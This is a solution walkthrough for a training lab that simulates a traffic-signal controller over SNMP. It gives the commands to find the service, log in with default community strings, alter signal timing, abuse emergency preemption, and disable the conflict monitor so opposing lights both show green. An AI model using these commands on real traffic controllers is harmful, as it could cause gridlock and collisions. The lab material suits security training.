# MetroGrid (Scenario 2): Solution Commands

**Facility:** 4-Way Traffic Intersection
**Protocol:** SNMP v2c (NTCIP-inspired) · Port 5021/UDP
**Community strings:** `public` (read), `private` (read-write)
**Base OID:** 1.3.6.1.4.1.99999.1

---

## Real-world tooling & context

SNMP v2c is authentication-by-obscurity: its only credential is a plaintext
**community string**, effectively a shared password sent in the clear with no
encryption. Anyone who can reach the port and knows (or sniffs, or guesses) the
community gets full access: `public` for read, `private` for read-write. These
factory defaults are rarely changed; the 2014 University of Michigan study found
~100 real intersections exposed with exactly these strings.

| Step | Tool |
|------|------|
| Find the UDP port | `nmap -sU` (needs `sudo` for raw sockets) |
| Enumerate the tree | `snmpwalk` (net-snmp) |
| Read / write values | `snmpget` / `snmpset` (net-snmp) |

**Notes for this lab:**
- SNMP normally runs on **UDP 161**; this lab uses **5021**. `nmap -sU` requires
  root, and nmap's SNMP NSE scripts are gated to the standard port, so (as with
  Modbus) the reliable move is to just **speak the protocol**: `snmpwalk -c public
  <host>:5021`. If data comes back, it is SNMP and the default community works.
- Values are raw **integers or enums** (e.g. light state 1=red, 2=yellow, 3=green),
  not scaled. See the OID Map in the Lab Monitor for names, access, and meaning.
- Because v2c is cleartext, the community strings and every value are **visible to a
  network sniffer**, the same eavesdropping weakness as Modbus.

---

## Phase 1: Discovery & Enumeration

**Objective:** Discover the SNMP service, guess the community string, and enumerate all OIDs to map the intersection's control parameters.

```bash
# Step 1: Scan for open UDP ports on the target (UDP scan needs root)
sudo nmap -sU -p 161,162,5020-5030 localhost
# Look for any open UDP port; SNMP typically runs on 161,
# but ICS devices often use non-standard ports (here it's 5021).

# Step 2: Walk the entire device using default credentials
# 'public' is the most common factory-default community string.
# 1.3.6.1 is the universal 'internet' OID root that ALL SNMP data lives under;
# walking from it dumps everything the device exposes. Do NOT omit the OID:
# net-snmp then defaults to mib-2 (1.3.6.1.2.1), which this controller does not
# implement, so you'd get 'No Such Instance' and wrongly think the community
# failed. This device only exposes a private enterprise branch (…4.1.99999.1).
snmpwalk -v2c -c public -On localhost:5021 1.3.6.1
# -On prints raw numeric OIDs (e.g. .1.3.6.1.4.1.99999.1.1.1.0). Without it,
# net-snmp abbreviates the 1.3.6.1.4.1 prefix to the name 'enterprises'.
# If data comes back, you've confirmed two things at once:
#   1. The device speaks SNMP
#   2. The default 'public' credential was never changed

# Step 3: Read a specific OID to understand the data format
# Pick one from the walk output and query it directly:
snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.1.1.0
# Compare the value to the Intersection View; they should match.

# Step 4: Try 'private', the other common default credential
# If it works, you may have WRITE access to the controller
snmpget -v2c -c private localhost:5021 1.3.6.1.4.1.99999.1.6.1.0
# Same data returned? You now have READ-WRITE access.
# Check the OID Map above to see which OIDs are writable.
```

---

## Phase 2: Timing Manipulation

**Objective:** Change traffic signal timing to cause gridlock on one direction while giving the other excessive green time.

```bash
# Attack A: STARVE N-S direction (5s green instead of 30s)
# Cars barely clear before it turns red again
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.6.1.0 i 5

# Attack B: Give E-W excessive green time (120s)
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.6.2.0 i 120

# Combined: Starve N-S AND boost E-W
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.6.1.0 i 5
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.6.2.0 i 120

# Monitor gridlock level:
snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.4.2.0
```

---

## Phase 3: Emergency Preemption Abuse

**Objective:** Trigger the emergency vehicle preemption (EVP) system to override normal signal cycling and force one direction to permanent green.

```bash
# Trigger N-S preemption (all E-W goes red)
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.8.1.0 i 1

# Watch E-W queue build up (they NEVER get green).
# (macOS has no 'watch' by default: use a shell loop, or `brew install watch`.)
while true; do
  snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.2.2.0
  sleep 1
done

# Switch to E-W preemption (now N-S is starved):
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.8.1.0 i 2

# Disable preemption (return to normal cycling):
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.8.1.0 i 0
```

---

## Phase 4: Conflict Monitor Bypass

**Objective:** Disable the safety system (conflict monitor) and then force opposing green lights simultaneously, creating a collision risk at the intersection.

```bash
# Step 1: Hold phase 1 (N-S green stays on)
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.7.1.0 i 1

# Step 2: Activate preemption for E-W (opposite direction)
# Phase hold wants N-S green, preemption wants E-W green
# These are CONFLICTING demands!
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.8.1.0 i 2
# The conflict monitor catches it → FLASH MODE (safe failure)
# Verify flash mode is active:
snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.5.2.0
# Should return INTEGER: 1 (flash mode ON)

# Step 3: Clear the conflict, then DISABLE the safety system
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.8.1.0 i 0
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.7.1.0 i 0
# Now disable the conflict monitor (the TRISIS/Triton move):
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.9.1.0 i 0

# Step 4: Re-create the conflict, WITH NO SAFETY NET
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.7.1.0 i 1
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.8.1.0 i 2
# Both directions now have GREEN, COLLISION RISK!
# Verify conflict detected (no flash mode to save us):
snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.5.3.0
# Should return INTEGER: 1 (conflict detected, no safe failure)

# To restore safety:
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.9.1.0 i 1
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.8.1.0 i 0
snmpset -v2c -c private localhost:5021 \
  1.3.6.1.4.1.99999.1.7.1.0 i 0
```